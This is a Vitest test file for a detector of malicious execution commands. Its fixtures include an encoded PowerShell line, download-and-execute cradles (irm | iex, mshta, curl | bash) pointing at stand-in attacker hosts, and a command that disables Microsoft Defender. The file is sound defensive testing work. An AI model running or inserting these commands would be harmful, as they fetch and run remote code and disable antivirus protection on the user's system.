import { describe, it, expect } from "vitest";
import { detectExecutionCommands } from "../../src/engine/detectors/command-detector";

describe("Command Detector", () => {
  it("detects encoded PowerShell command lines", () => {
    const text = "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA";
    const signals = detectExecutionCommands(text);

    expect(signals.length).toBeGreaterThan(0);
    expect(signals[0].type).toBe("EXECUTION_INSTRUCTION");
    expect(signals[0].reason).toContain("base64-encoded");
  });

  it("detects in-memory download cradles (irm | iex)", () => {
    const text = "irm https://malicious-domain.xyz/payload.ps1 | iex";
    const signals = detectExecutionCommands(text);

    expect(signals.length).toBeGreaterThan(0);
    expect(signals[0].type).toBe("EXECUTION_INSTRUCTION");
  });

  it("detects dangerous living-off-the-land binaries (mshta / certutil)", () => {
    const text = "mshta http://payload.example/run.hta";
    const signals = detectExecutionCommands(text);

    expect(signals.length).toBeGreaterThan(0);
    expect(signals[0].reason).toContain("living-off-the-land");
  });

  it("detects defense evasion attempting to disable Microsoft Defender", () => {
    const text = "powershell -c Set-MpPreference -DisableRealtimeMonitoring $true";
    const signals = detectExecutionCommands(text);

    expect(signals.some((s) => s.reason.includes("disable antivirus"))).toBe(true);
  });

  it("detects Mac / Linux ClickFix remote shell pipelines", () => {
    const text = 'curl -fsSL https://evil.sh/payload | bash';
    const signals = detectExecutionCommands(text);

    expect(signals.length).toBeGreaterThan(0);
    expect(signals[0].snippet).toContain("Remote execution pipeline");
  });
});

